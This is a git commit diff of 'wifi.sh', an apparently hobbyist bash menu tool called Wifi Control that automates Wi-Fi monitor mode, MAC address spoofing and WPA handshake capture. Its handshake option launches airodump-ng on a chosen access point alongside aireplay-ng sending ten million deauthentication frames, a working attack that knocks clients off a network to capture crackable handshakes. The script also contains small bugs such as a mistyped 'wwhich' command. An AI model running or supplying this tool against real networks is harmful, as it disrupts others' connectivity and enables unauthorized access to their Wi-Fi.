9bf2258e9abf1351aa4a834ae462ec454428245b
Root Permission <89262048+moemen-n7@users.noreply.github.com>
2022-02-12 22:28:14 +0200

    Update wifi.sh

--- wifi.sh
+++ wifi.sh
@@ -7,13 +7,50 @@ resize -s 80 95  > /dev/null
 green='\e[0;32m'
 red='\e[1;31m'
 yellow='\e[1;33m'
-RedF="${Escape}[31m";
+RedF="${Escape}[31m"
 LighGreenF="${Escape}[92m"
 blue='\e[1;34m'
 # Check root
 [[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
 clear 
 
+#check if gnome-terminal is installed
+which gnome-terminal > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] gnome-terminal............................. [ found ] "
+which gnome-terminal > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] gnome-terminal -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing gnome-terminal "
+sleep 2
+echo -e $green ""
+sudo apt-get install gnome-terminal -y
+echo -e $blue "[ ✔ ] Done installing .... "
+which gnome-terminal > /dev/null 2>&1
+fi
+
+#check if macchanger is installed
+wwhich macchanger > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] macchanger............................. [ found ] "
+which macchanger > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] macchanger -> ${RedF}not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing macchanger "
+sleep 2
+echo -e $green ""
+sudo apt-get install macchanger -y
+echo -e $blue "[ ✔ ] Done installing .... "
+which macchanger > /dev/null 2>&1
+fi
+
+clear
 echo -e $red "░██╗░░░░░░░██╗██╗███████╗██╗░░░░██╗░█████╗░░█████╗░███╗░░██╗████████╗██████╗░░█████╗░██╗░░░░░"; sleep 0.2
 echo -e $red "░██║░░██╗░░██║██║██╔════╝██║░░░██╔╝██╔══██╗██╔══██╗████╗░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░"; sleep 0.2
 echo -e $red "░╚██╗████╗██╔╝██║█████╗░░██║░░██╔╝░██║░░╚═╝██║░░██║██╔██╗██║░░░██║░░░██████╔╝██║░░██║██║░░░░░"; sleep 0.2
@@ -23,8 +60,9 @@ echo -e $red "░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░
 
 echo 
 echo "╔─────────────────────────────────────────╗"; sleep 0.5
-echo "|My Github  https://github.com/moemenkali |"; sleep 0.5
-echo "┖─────────────────────────────────────────┙"; sleep 0.5     
+echo "|My Github  https://github.com/moemen-n7  |"; sleep 0.5
+echo "┖─────────────────────────────────────────┙"; sleep 0.5
+sudo cat /etc/issue.net       
 echo 
           echo -e $green"          ""(<1>Monitor mode)"; sleep 0.2
 echo 
@@ -32,11 +70,11 @@ echo
 echo 
           echo -e $green"          ""(<3>Mac channger)"; sleep 0.2
 echo 
-          echo -e $green"          ""(<4>Handshake)"; sleep 0.2
+          echo -e $green"          ""(<4>handshake)"; sleep 0.2
 echo  
 read -p "          ""Choose from options >> " choose
 echo 
-echo "<Starting up>"; sleep 1
+echo "<Starting up>"; sleep 2
 
 if [ $choose -eq 1 ]
 then 
@@ -52,7 +90,7 @@ echo
 echo -e $green
 iwconfig
 echo "============================================"; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan 
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
 echo "============================================"; sleep 0.2
 echo 
 ifconfig $wlan down
@@ -84,7 +122,7 @@ clear
  echo -e $green
 iwconfig
 echo "============================================"; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan 
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
 echo "============================================"; sleep 0.2
 echo 
 ifconfig $wlan down
@@ -101,6 +139,7 @@ echo "managed mod is up enjoy! :)"
 
 if [ $choose -eq 3 ]
 then 
+#!/bin/bash
 clear
 echo -e $red"███╗░░░███╗░█████╗░░█████╗░░█████╗░██╗░░██╗░█████╗░███╗░░██╗░██████╗░███████╗██████╗░"; sleep 0.2
 echo -e $red"████╗░████║██╔══██╗██╔════╗██╔════╗██║░░██║██╔══██╗████╗░██║██╔════╝░██╔════╝██╔══██╗"; sleep 0.2
@@ -108,22 +147,25 @@ echo -e $red"██║╚██╔╝██║██╔══██║██║�
 echo -e $red"██║░╚═╝░██║██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░░██║██║░╚███║╚██████╔╝███████╗██║░░██║"; sleep 0.2
 echo -e $red"╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝"; sleep 0.2
 echo -e $green
-echo "               ""<1>Print the MAC adress:-"; sleep 0.2
+echo
+echo "               ""<1>Print the MAC adress >> "; sleep 0.2
 echo 
-echo "               ""<2>Set fully random MAC:-"; sleep 0.2
+echo "               ""<2>Set fully random MAC >> "; sleep 0.2
 echo 
-echo "               ""<3>Reset to original:-"; sleep 0.2
+echo "               ""<3>Reset to original >> "; sleep 0.2
 echo 
-echo "               ""<4>mac changer manual:-"; sleep 0.2
+echo "               ""<4>mac changer manual >> "; sleep 0.2
 echo 
 read -p "Choose from options >> " choose 
 echo 
+
+
 if [ $choose -eq 1 ]
 then
 clear
 iwconfig
 echo "================================================"; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan
 echo "================================================"; sleep 0.2
 macchanger --show $wlan
 fi
@@ -137,19 +179,23 @@ then
 clear
 iwconfig
 echo "================================================"; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan
 echo "================================================"; sleep 0.2
 ifconfig $wlan down
 macchanger --random $wlan
 ifconfig $wlan up
 macchanger --show $wlan
   fi
+  
+  
+  
+  
 if [ $choose -eq 3 ]
 then
 clear
 iwconfig
 echo "================================================"; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan 
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
 echo "================================================"; sleep 0.2
 ifconfig $wlan down
 sudo macchanger  --permanent $wlan
@@ -164,12 +210,12 @@ then
 clear
 iwconfig
 echo "=================================================="; sleep 0.5
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan
 echo "=================================================="; sleep 0.5
 sleep 0.5
 ifconfig $wlan down
 echo "========================"; sleep 0.5
-read -p "enter the mac :-" mac
+read -p "enter the mac :- " mac
 echo "========================"; sleep 0.5
 ifconfig $wlan hw ether $mac
 ifconfig $wlan up
@@ -192,73 +238,65 @@ clear
         echo -e $red"╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝"; sleep 0.2
         echo 
         echo 
-        
-#check if gnome-terminal is installed
-which gnome-terminal > /dev/null 2>&1
-if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] gnome-terminal............................. [ found ] "
-which gnome-terminal > /dev/null 2>&1
-sleep 2
-else
-echo ""
-echo -e $red "[ X ] gnome-terminal -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing gnome-terminal "
-sleep 2
-echo -e $green ""
-sudo apt install gnome-terminal -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which gnome-terminal > /dev/null 2>&1
-fi
-echo 
 echo 
 echo -e $green
 iwconfig 
 echo 
 echo "================================================="; sleep 0.2
-read -p "enter your interface (wlan0,wlan0mon) :-" wlan 
+read -p "enter your interface (wlan0,wlan0mon) :- " wlan 
 echo "================================================="; sleep 0.2
 sleep 0.5
 echo
-monitor_mode() {
-	echo -e "[${yellow}*${default}] Eliminating processes that might interfere with the aircrack-ng suite..."
-	if airmon-ng check kill; then
-		echo -e "[${green}*${default}] Operation completed successfully."
-	else
-		echo -e "[${red}!${default}] Operation failed!"
-		exit 1
-	fi
-	echo -e "[${yellow}*${default}] Trying to enable monitor mode on selected wireless network interface..."
-	ifconfig $wlan down
-	if iwconfig $wlan mode monitor; then
-		echo -e "[${green}*${default}] Monitor mode enabled on selected wireless network interface."
-	else
-		echo -e "[${red}!${default}] Operation failed!"
-		exit 1
-	fi
-	ifconfig $wlan up
-}
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode monitor
+ifconfig $wlan up
+clear
+iwconfig
+sleep 1s
 echo
+clear
 airodump-ng $wlan
 echo "======================================"; sleep 0.2
-read -p "but the bssid (mac adress):-" mac 
+ # detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+sleep 1
+echo ""
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode managed
+ifconfig $wlan up
+service NetworkManager restart
+clear
+echo -e $yellow" Thanks For Using Wifi Control :)"
+exit
+}
+read -p "but the bssid (mac adress):- " mac 
 echo "======================================"; sleep 0.2
 sleep 0.5
 echo 
 echo "=========================="; sleep 0.2
-read -p "but the channel:-" ch 
+read -p "but the channel:- " ch 
 echo "=========================="; sleep 0.2
 sleep 0.5
 echo
 echo "========================================"; sleep 0.2
-read -p "but the name of the handshake:-" name 
+read -p "but the name of the handshake:- " name 
 echo "========================================"; sleep 0.2
 sleep 0.5
-clear
 gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $wlan --bssid $mac -c $ch -w $name 
  gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x aireplay-ng --deauth 10000000 -a $mac $wlan 
-  fi
+ifconfig $wlan down
+airmon-ng check kill
+iwconfig $wlan mode managed
+ifconfig $wlan up
+service NetworkManager restart
+clear
+echo -e $yellow" Thanks For Using Wifi Control :)"
+exit
+fi
 
 
 
@@ -270,4 +308,3 @@ echo -e $green"    ""|              <Made by Moemen_N7>             |"; sleep 0.
 echo -e $green"    ""|https://github.com/moemenkali/Wifi-Control.git|"; sleep 0.5
 echo -e $green"    ""┖──────────────────────────────────────────────┙"; sleep 0.5
 echo -e $yellow"               ""Thanks For Using Wifi Control  :)"; sleep 0.5
-exit
